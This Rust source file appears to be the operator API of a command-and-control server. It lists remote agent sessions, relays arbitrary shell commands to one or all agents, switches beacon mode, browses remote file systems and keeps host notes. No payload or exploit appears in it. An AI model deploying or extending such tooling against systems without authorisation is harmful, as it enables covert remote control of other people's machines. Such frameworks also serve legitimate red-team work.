// src/api/routes/hosts.rs
use axum::{
    extract::{Path, State, Query},
    http::StatusCode,
    response::{IntoResponse, Response},
    Json, Extension,
};
use std::sync::Arc;
use tokio::sync::oneshot;
use serde::Deserialize;

use crate::api::state::ApiContext;
use crate::api::models::{SessionDto, CommandRequest};
use crate::api::middleware::OperatorInfo;
use crate::database;

#[derive(Deserialize)]
pub struct BrowseQuery {
    path: Option<String>,
}

pub async fn list_hosts(State(state): State<Arc<ApiContext>>) -> Json<Vec<SessionDto>> {
    let sessions = &state.sessions;
    let proxies = state.proxies.lock().unwrap_or_else(|e| e.into_inner());
    
    let db = state.db.clone();
    
    let dtos: Vec<SessionDto> = sessions.iter().map(|entry| {
        let id = entry.key();
        let session = entry.value();
        let (is_active, profile, tags) = {
            if let Ok(conn) = db.get() {
                let active = database::is_session_active(&conn, *id);
                let prof = database::get_session_profile(&conn, *id);
                let t = database::get_session_tags(&conn, *id);
                (active, prof, t)
            } else {
                (false, "unknown".to_string(), Vec::new())
            }
        };

        SessionDto {
            id: *id,
            hostname: session.hostname.clone(),
            ip: session.addr.ip().to_string(),
            os: session.os.clone(),
            computer_id: session.computer_id.clone(),
            has_proxy: proxies.contains_key(id),
            parent_id: session.parent_id,
            is_active,
            profile,
            last_seen_secs: session.seconds_since_seen(),
            tags,
        }
    }).collect();

    Json(dtos)
}

pub async fn send_command(
    State(state): State<Arc<ApiContext>>,
    Extension(operator): Extension<OperatorInfo>,
    Path(id): Path<u32>,
    Json(payload): Json<CommandRequest>,
) -> Response {
    // Viewer role cannot execute commands
    if operator.is_viewer() {
        return (StatusCode::FORBIDDEN, Json(serde_json::json!({"error": "Viewers cannot execute commands"}))).into_response();
    }

    // Audit log the command
    if let Ok(conn) = state.db.get() {
        database::audit_log(&conn, operator.id, &operator.username, "command",
            Some(id), Some(&payload.command));
    }

    // Intercept Beacon Mode commands to update DB state immediately
    if payload.command == "beacon:mode active" {
        if let Ok(conn) = state.db.get() {
            database::set_session_active(&conn, id, true);
        }
    } else if payload.command == "beacon:mode passive" {
        if let Ok(conn) = state.db.get() {
            database::set_session_active(&conn, id, false);
        }
    }

    let sender_option = {
        let sessions = &state.sessions;
        sessions.get(&id).map(|s| s.tx.clone())
    };

    if let Some(tx_channel) = sender_option {
        let (cb_tx, cb_rx) = oneshot::channel::<u64>();
        
        match tx_channel.send((payload.command.clone(), Some(cb_tx))) {
            Ok(_) => {
                // Timeout the callback await. If the session handler dies or
                // drops the oneshot without responding, this would hang the
                // API worker thread indefinitely without a timeout.
                match tokio::time::timeout(
                    std::time::Duration::from_secs(30),
                    cb_rx
                ).await {
                    Ok(Ok(req_id)) => (StatusCode::OK, Json(serde_json::json!({ "status": "queued", "session_id": id, "request_id": req_id }))).into_response(),
                    Ok(Err(_)) => (StatusCode::INTERNAL_SERVER_ERROR, Json(serde_json::json!({"error": "Callback dropped"}))).into_response(),
                    Err(_) => (StatusCode::GATEWAY_TIMEOUT, Json(serde_json::json!({"error": "Command callback timed out (30s)"}))).into_response(),
                }
            },
            Err(_) => (StatusCode::INTERNAL_SERVER_ERROR, Json(serde_json::json!({"error": "Failed to send to channel"}))).into_response(),
        }
    } else {
        (StatusCode::NOT_FOUND, Json(serde_json::json!({"error": "Session ID not found"}))).into_response()
    }
}

pub async fn get_output(
    State(state): State<Arc<ApiContext>>,
    Path((session_id, request_id)): Path<(u32, u64)>,
) -> Response {
    let results = state.results.lock().unwrap_or_else(|e| e.into_inner());
    if let Some(response) = results.get(&(session_id, request_id)) {
        (StatusCode::OK, Json(serde_json::json!({
            "status": "completed",
            "output": response.output,
            "error": response.error,
            "exit_code": response.exit_code
        }))).into_response()
    } else {
        (StatusCode::NOT_FOUND, Json(serde_json::json!({ "status": "pending_or_not_found", "message": "Output not available yet or ID invalid" }))).into_response()
    }
}

pub async fn broadcast(
    State(state): State<Arc<ApiContext>>,
    Extension(operator): Extension<OperatorInfo>,
    Json(payload): Json<CommandRequest>,
) -> Response {
    // Viewer role cannot execute commands
    if operator.is_viewer() {
        return (StatusCode::FORBIDDEN, Json(serde_json::json!({"error": "Viewers cannot broadcast commands"}))).into_response();
    }

    let sessions = &state.sessions;
    let mut count = 0;
    
    let db_inner = state.db.clone();
    let cmd_log = payload.command.clone();
    let op_id = operator.id;
    let op_name = operator.username.clone();
    let active_ids: Vec<u32> = sessions.iter().map(|e| *e.key()).collect();

    tokio::task::spawn_blocking(move || {
        if let Ok(conn) = db_inner.get() {
            database::audit_log(&conn, op_id, &op_name, "broadcast", None, Some(&cmd_log));
            for id in active_ids {
                let req_id = rand::random::<u64>();
                database::log_command(&conn, id, req_id, &cmd_log);
            }
        }
    });

    for entry in sessions.iter() {
        if entry.value().tx.send((payload.command.clone(), None)).is_ok() { count += 1; }
    }
    (StatusCode::OK, Json(serde_json::json!({ "status": "broadcast_queued", "targets_reached": count }))).into_response()
}

// [NEW] Interactive File Browser Endpoint
pub async fn browse_files(
    State(state): State<Arc<ApiContext>>,
    Path(id): Path<u32>,
    Query(query): Query<BrowseQuery>,
) -> Response {
    let path = query.path.unwrap_or_else(|| ".".to_string());
    let command = format!("fs:ls {}", path);

    let sender_option = {
        let sessions = &state.sessions;
        sessions.get(&id).map(|s| s.tx.clone())
    };

    if let Some(tx_channel) = sender_option {
        let (cb_tx, cb_rx) = oneshot::channel::<u64>();
        
        // 1. Send Command to Agent
        match tx_channel.send((command, Some(cb_tx))) {
            Ok(_) => {
                // 2. Wait for Request ID (with timeout)
                let req_id = match tokio::time::timeout(
                    std::time::Duration::from_secs(30),
                    cb_rx
                ).await {
                    Ok(Ok(rid)) => rid,
                    Ok(Err(_)) => return (StatusCode::INTERNAL_SERVER_ERROR, Json(serde_json::json!({"error": "Failed to queue command"}))).into_response(),
                    Err(_) => return (StatusCode::GATEWAY_TIMEOUT, Json(serde_json::json!({"error": "Command callback timed out (30s)"}))).into_response(),
                };

                // 3. Poll for result (Simple polling loop since this is interactive)
                // In production, use a Notify or Condvar, but polling is fine for MVP
                let start = std::time::Instant::now();
                loop {
                    if start.elapsed().as_secs() > 10 {
                        return (StatusCode::GATEWAY_TIMEOUT, Json(serde_json::json!({"error": "Timeout waiting for agent response"}))).into_response();
                    }

                    // Scope lock
                    {
                        let results = state.results.lock().unwrap_or_else(|e| e.into_inner());
                        if let Some(response) = results.get(&(id, req_id)) {
                            // If Agent returned error in output
                            if !response.error.is_empty() {
                                return (StatusCode::BAD_REQUEST, Json(serde_json::json!({"error": response.error}))).into_response();
                            }
                            
                            // Parse JSON from output
                            let json_res: serde_json::Value = match serde_json::from_str(&response.output) {
                                Ok(j) => j,
                                Err(_) => return (StatusCode::INTERNAL_SERVER_ERROR, Json(serde_json::json!({"error": "Invalid JSON from agent", "raw": response.output}))).into_response(),
                            };
                            
                            return (StatusCode::OK, Json(json_res)).into_response();
                        }
                    }
                    tokio::time::sleep(tokio::time::Duration::from_millis(200)).await;
                }
            },
            Err(_) => (StatusCode::INTERNAL_SERVER_ERROR, Json(serde_json::json!({"error": "Agent disconnected"}))).into_response(),
        }
    } else {
        (StatusCode::NOT_FOUND, Json(serde_json::json!({"error": "Session offline"}))).into_response()
    }
}

// ── Session Notes & Tags ───────────────────────────────────────────────

#[derive(Deserialize)]
pub struct AddNoteRequest {
    pub note: String,
    #[serde(default)]
    pub tag: Option<String>,
}

/// GET /api/hosts/:id/notes
pub async fn get_notes(
    State(state): State<Arc<ApiContext>>,
    Path(id): Path<u32>,
) -> Response {
    let conn = match state.db.get() {
        Ok(c) => c,
        Err(_) => return (StatusCode::INTERNAL_SERVER_ERROR, Json(serde_json::json!({"error": "DB"}))).into_response(),
    };
    let notes = database::get_session_notes(&conn, id);
    let tags = database::get_session_tags(&conn, id);
    (StatusCode::OK, Json(serde_json::json!({"notes": notes, "tags": tags}))).into_response()
}

/// POST /api/hosts/:id/notes
pub async fn add_note(
    State(state): State<Arc<ApiContext>>,
    Extension(operator): Extension<OperatorInfo>,
    Path(id): Path<u32>,
    Json(payload): Json<AddNoteRequest>,
) -> Response {
    let conn = match state.db.get() {
        Ok(c) => c,
        Err(_) => return (StatusCode::INTERNAL_SERVER_ERROR, Json(serde_json::json!({"error": "DB"}))).into_response(),
    };
    match database::add_session_note(&conn, id, payload.tag.as_deref(), &payload.note, &operator.username) {
        Ok(note_id) => (StatusCode::CREATED, Json(serde_json::json!({"id": note_id}))).into_response(),
        Err(e) => (StatusCode::BAD_REQUEST, Json(serde_json::json!({"error": format!("{}", e)}))).into_response(),
    }
}

/// DELETE /api/hosts/:id/notes/:note_id
pub async fn delete_note(
    State(state): State<Arc<ApiContext>>,
    Path((id, note_id)): Path<(u32, i64)>,
) -> Response {
    let conn = match state.db.get() {
        Ok(c) => c,
        Err(_) => return (StatusCode::INTERNAL_SERVER_ERROR, Json(serde_json::json!({"error": "DB"}))).into_response(),
    };
    if database::delete_session_note(&conn, id, note_id) {
        (StatusCode::OK, Json(serde_json::json!({"status": "deleted"}))).into_response()
    } else {
        (StatusCode::NOT_FOUND, Json(serde_json::json!({"error": "Not found"}))).into_response()
    }
}
